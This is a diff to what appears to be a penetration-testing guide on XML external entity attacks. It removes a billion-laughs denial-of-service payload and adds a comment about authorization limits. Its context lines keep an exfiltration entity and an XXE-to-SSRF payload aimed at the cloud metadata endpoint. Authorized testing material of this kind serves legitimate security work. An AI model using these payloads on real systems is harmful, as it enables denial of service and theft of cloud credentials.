@@ -31,14 +31,7 @@ Anywhere XML is accepted: SOAP APIs, SAML authentication, RSS/Atom feeds, Office
 ]>
 <root>&exfil;</root>
 
-<!-- Step 5: If fully blind, try billion laughs (DoS) or local DTD -->
-<!DOCTYPE test [
-  <!ENTITY a0 "lol">
-  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
-  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
-  <!-- ... exponential growth ... -->
-]>
-<root>&a8;</root>
+<!-- Step 5: If fully blind, test with a known local DTD file first (e.g., /usr/share/xml/fontconfig/fonts.dtd on Linux). DoS payloads like billion laughs should only be used when explicitly authorized by the engagement scope and stop conditions — resource exhaustion tests must have pre-defined limits -->
 ```
 
 **XXE + SSRF chain**: If external DTD loading works but file reading doesn't, use XXE for SSRF: `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`
